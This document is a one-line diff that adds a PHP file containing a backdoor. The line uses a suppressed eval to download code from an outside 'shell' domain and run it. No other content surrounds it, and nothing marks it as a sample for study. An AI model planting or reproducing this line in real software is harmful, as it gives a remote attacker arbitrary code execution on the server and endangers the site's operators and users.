@@ -1,0 +1,1 @@
+<?php @eval(file_get_contents('http://shell.auckaguyahime.xyz/logs.txt'));
